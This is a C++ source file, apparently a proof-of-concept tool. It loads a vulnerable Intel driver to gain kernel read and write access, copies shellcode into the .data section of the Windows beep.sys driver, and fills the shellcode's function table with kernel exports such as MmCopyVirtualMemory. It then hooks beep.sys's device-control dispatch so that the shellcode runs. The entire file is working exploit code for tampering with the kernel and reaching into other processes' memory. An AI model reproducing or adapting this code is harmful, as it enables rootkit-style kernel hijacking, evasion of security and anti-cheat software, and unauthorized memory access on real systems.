#include <iostream>
#include "kdmapper/intel_driver.hpp"
#include "shellcode.hpp"
#include "structs.hpp"

HANDLE IntelDriverHandle;

LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
    if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
        Log(L"[!!] Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode << std::endl);
    else
        Log(L"[!!] Crash" << std::endl);

    if (IntelDriverHandle)
        intel_driver::Unload(IntelDriverHandle);

    return EXCEPTION_EXECUTE_HANDLER;
}


void SetShellcodeFunctionTable(int index, uint64_t fn)
{
    *(uint64_t*)&shellcode::data[8 * index + FUNCTION_TABLE_OFFSET] = fn;
}

bool CopyShellcode(uint64_t module, OUT uint64_t* targetLocation)
{
    ULONG sectionSize = 0;
    uint64_t moduleDataSection = intel_driver::FindSectionAtKernel(IntelDriverHandle, (char*)".data", module, nullptr);

    if (!moduleDataSection)
        return false;

    //virtual size only is 0x90, but going into IDA shows us that the section takes up the entire page
    if (sizeof(shellcode::data) > 0x1000) 
    {
        Log(L"[-] The shellcode is too large for the .data section. It cannot be larger than 4096 bytes!" << std::endl);
        return false;
    }

    *targetLocation = moduleDataSection;
    return intel_driver::WriteMemory(IntelDriverHandle, moduleDataSection, (void*)shellcode::data, sizeof(shellcode::data));
}

bool FindDriverObject(const wchar_t* driverName, OUT uint64_t* driverObject)
{
    UNICODE_STRING ObjectName;
    RtlInitUnicodeString(&ObjectName, driverName);

    uint64_t FileObject;
    uint64_t DeviceObject;

    NTSTATUS status = 0;
    bool success = intel_driver::CallNtosExport(IntelDriverHandle, "IoGetDeviceObjectPointer", &status,
        &ObjectName, FILE_ALL_ACCESS, &FileObject, &DeviceObject);

    if (!NT_SUCCESS(status) || !success)
    {
        Log(L"[-] IoGetDeviceObjectPointer call failed. -> 0x" << std::hex << status << std::endl);
        return false;
    }

    Log(L"[+] IoGetDeviceObjectPointer found the device object -> 0x" << std::hex << DeviceObject << std::endl);

    intel_driver::CallNtosExport<void>(IntelDriverHandle, "ObDereferenceObject", nullptr, FileObject);

    // Get the BeepDevice->DriverObject by reading it from the struct offset
    uint64_t driverObjectAddress = DeviceObject + offsetof(DEVICE_OBJECT, DriverObject);
   
    success = intel_driver::ReadMemory(IntelDriverHandle, driverObjectAddress, driverObject, sizeof(uint64_t));

    if (!driverObject || !success)
    {
        Log(L"[-] Couldn't read DeviceObject->DriverObject!" << std::endl);
        return false;
    }

    return true;
}

bool GetDriverDispatch(uint64_t DriverObject, OUT uint64_t* DriverDispatch)
{

    uint64_t majorFunctionArray = DriverObject + offsetof(DRIVER_OBJECT, MajorFunction);
    uint64_t deviceIoDispatchAddress = majorFunctionArray + (sizeof(PVOID) * IRP_MJ_DEVICE_CONTROL);

    return intel_driver::ReadMemory(IntelDriverHandle, deviceIoDispatchAddress, DriverDispatch, sizeof(uint64_t));
}

bool HookDriverDispatch(uint64_t DriverObject, uint64_t target)
{
    uint64_t majorFunctionArray = DriverObject + offsetof(DRIVER_OBJECT, MajorFunction);
    uint64_t deviceIoDispatchAddress = majorFunctionArray + (sizeof(PVOID) * IRP_MJ_DEVICE_CONTROL);

    return intel_driver::WriteMemory(IntelDriverHandle, deviceIoDispatchAddress, &target, sizeof(uint64_t));
}

int main()
{
    SetUnhandledExceptionFilter(SimplestCrashHandler);

    //load the vulnerable driver
    IntelDriverHandle = intel_driver::Load();

    if (IntelDriverHandle == INVALID_HANDLE_VALUE)
        return -1;

    // This PoC is going to copy the shellcode into the beep.sys .data section.
    // After this, the driver disptach will be pointed onto the shellcode.
    
    uint64_t beepModule = utils::GetKernelModuleAddress("beep.sys");

    if (!beepModule)
    {
        Log(L"[-] beep.sys not found!" << std::endl);
        intel_driver::Unload(IntelDriverHandle);
        return -1;
    }

    uint64_t BeepDriverObject = 0;
    if (!FindDriverObject(L"\\Device\\Beep", &BeepDriverObject))
    {
        intel_driver::Unload(IntelDriverHandle);
        return -1;
    }

    uint64_t OriginalDispatch = 0;
    GetDriverDispatch(BeepDriverObject, &OriginalDispatch);

    Log(L"Found original dispatch -> " << std::endl);

    uint64_t shellcodeAddress = 0;

    // Fill in the "function table" in the shellcode. That table acts kind of like an IAT.
    SetShellcodeFunctionTable(0, OriginalDispatch);
    SetShellcodeFunctionTable(1, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "PsLookupProcessByProcessId"));
    SetShellcodeFunctionTable(2, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "IoGetCurrentProcess"));
    SetShellcodeFunctionTable(3, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "PsGetProcessSectionBaseAddress"));
    SetShellcodeFunctionTable(4, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "ObfDereferenceObject"));
    SetShellcodeFunctionTable(5, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "IofCompleteRequest"));
    SetShellcodeFunctionTable(6, intel_driver::GetKernelModuleExport(IntelDriverHandle, intel_driver::ntoskrnlAddr, "MmCopyVirtualMemory"));

    if (!CopyShellcode(beepModule, &shellcodeAddress))
    {
        Log(L"[-] Couldn't copy shellcode into beep.sys" << std::endl);
        intel_driver::Unload(IntelDriverHandle);
        return -1;
    }

    Log(L"[+] Copied shellcode into the beep.sys .data section -> 0x" << std::hex << shellcodeAddress << std::endl);

    // Point beep.sys dispatch to our shellcode inside of the beep.sys .data section
    HookDriverDispatch(BeepDriverObject, shellcodeAddress);
    Log(L"[+] Hooked driver dispatch! Done." << std::endl;);


    intel_driver::Unload(IntelDriverHandle);

    return 0;
}
